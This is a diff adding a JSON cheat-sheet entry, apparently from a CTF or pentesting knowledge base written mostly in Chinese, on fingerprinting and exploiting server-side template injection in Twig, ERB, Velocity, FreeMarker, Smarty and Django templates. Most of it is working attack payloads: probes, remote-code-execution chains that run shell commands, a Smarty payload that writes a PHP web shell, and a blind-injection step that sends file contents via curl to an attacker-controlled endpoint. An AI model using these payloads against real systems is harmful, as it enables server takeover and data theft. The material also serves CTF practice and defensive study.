@@ -1,0 +1,60 @@
+{
+ "id": "web-ssti-engine-cheatsheet",
+ "title": "SSTI 引擎指纹与 RCE 链速查(Jinja2 之外的 Django Template/Twig/ERB/Velocity/FreeMarker/Smarty)",
+ "vuln_pattern": "用户输入被送进服务端模板引擎渲染(不只是 Python Jinja2)——先指纹引擎再抄对应 RCE 链,每个引擎的逃逸点完全不同",
+ "fingerprint": [
+  "ssti",
+  "模板注入",
+  "template injection",
+  "twig",
+  "erb",
+  "velocity",
+  "freemarker",
+  "smarty",
+  "django template",
+  "Template(",
+  "render_template_string"
+ ],
+ "exploit_steps": [
+  "指纹探针按家族分组发:{{7*7}} (Jinja2/Twig/Smarty=49)、${7*7} (FreeMarker/Velocity/EL=49)、<%= 7*7 %> (ERB/EJS=49)、{{7*'7'}} (Jinja2=7777777,Twig 报错/0)、#{7*7} (Thymeleaf/Ruby 某些)。报错页直接吐引擎名与版本最快。",
+  "Python Jinja2(已有专卡 flask-ssti-jinja2):{{ c.__class__.__mro__[i].__subclasses__() }} 找 os._wrap_close/Popen;纯字符受限时 {%for c in ''.__class__.__mro__[1].__subclasses__()%} 逐个试。",
+  "Django Template(不是真 RCE 沙箱逃逸——Django 模板默认无 os 访问):攻击面是 {{ }} 里能到的 context 对象/字段(如 view 传入的 FLAG、settings 属性 {{ request.application }});用 {{ }} 枚举 context 变量名(错误信息/回显差异)读出敏感字段即够。",
+  "PHP Twig 1.x(Twig_Loader_String 时代):{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}};3.x 回调被禁后走 {% for %} 滥用 filter/sort 滤链或 apply spaceless;PHP 原生 Twig 常配 file_get_contents 读 flag。",
+  "Ruby ERB(Sinatra ERB.new(str).result(binding)):<%= system('cat /flag') %> / <%= `cat /flag` %>(反引号);输入校验只挡 <%= 时试 <% 输出 $stdout 或 #{} 内插。",
+  "Java Apache Velocity(完整反射链):#set($s='')#set($cls=$s.getClass())#set($rt=$cls.forName('java.lang.Runtime').getRuntime())#set($p=$rt.exec('cat /flag'))#set($is=$p.getInputStream())… 逐行 BufferedReader 读出 $output。",
+  "Java FreeMarker:<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")};新版限制时用 ?api 或 object_constructor。PHP Smarty:{system('id')} 或 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system($_GET[1]);?>\",self::clearConfig())}。",
+  "盲 SSTI(无回显):把命令输出外带到自己端点(curl http://me:8000/?x=$(cat /flag|base64)),或时间侧信道(Twig: {{7*7|sleep(5)}} 类按引擎语法)。"
+ ],
+ "key_payloads": [
+  "# Twig 1.x RCE\n{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"cat /flag\")}}\n# Ruby ERB\n<%= `cat /flag` %>\n# Velocity 反射链(压缩形)\n#set($x='')#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())#set($out=$rt.exec('cat /flag').inputStream)${out}",
+  "# 指纹矩阵\n{{7*7}}=49&{{7*'7'}}=7777777 -> Jinja2 | {{7*7}}=49&字符串乘法报错 -> Twig\n${7*7}=49 -> FreeMarker/Velocity | <%=7*7%>=49 -> ERB | #{7*7} -> Thymeleaf"
+ ],
+ "category": "web",
+ "cve": [],
+ "tags": [
+  "ssti",
+  "engine-fingerprint",
+  "twig",
+  "django-template",
+  "erb",
+  "velocity",
+  "freemarker",
+  "smarty",
+  "rce"
+ ],
+ "source": "writeup 提炼(多引擎 SSTI 实例与 writeup 分析)",
+ "source_tier": "seed",
+ "preconditions": [
+  "用户输入进入服务端模板渲染(搜索框/用户名/感谢语/邮件模板被当模板编译)",
+  "非 Jinja2 引擎指纹已出现(PHP/Java/Ruby 栈、Twig/Django/Velocity 特征)"
+ ],
+ "verify_oracle": "指纹探针回显 49/7777777 等确定引擎;RCE 命令输出或外带回显 flag",
+ "pitfalls": [
+  "Django Template 里死磕 os 属性——它默认没有;目标是 context 里的敏感变量,枚举字段而不是逃逸",
+  "Twig 3.x 上打 1.x 的 registerUndefinedFilterCallback 一律失败——先定版本再选链",
+  "Velocity 链必须逐 #set 分行,一行塞多个 #set 在部分版本解析失败",
+  "盲 SSTI 判定别用 print,用带外/时间差——渲染失败常静默"
+ ],
+ "anti_fingerprint": [],
+ "created_ts": 0.0
+}
